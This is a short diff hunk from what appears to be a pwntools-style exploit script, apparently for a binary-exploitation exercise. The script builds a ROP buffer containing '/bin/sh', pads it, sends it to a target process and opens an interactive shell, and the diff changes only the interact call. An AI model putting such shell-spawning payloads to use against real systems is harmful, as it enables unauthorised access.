@@ -20,4 +20,4 @@ buf += rop.string('/bin/sh')
 buf += rop.fill(100, buf)
 
 p.write(buf)
-p.interact()
+p.interact(0)
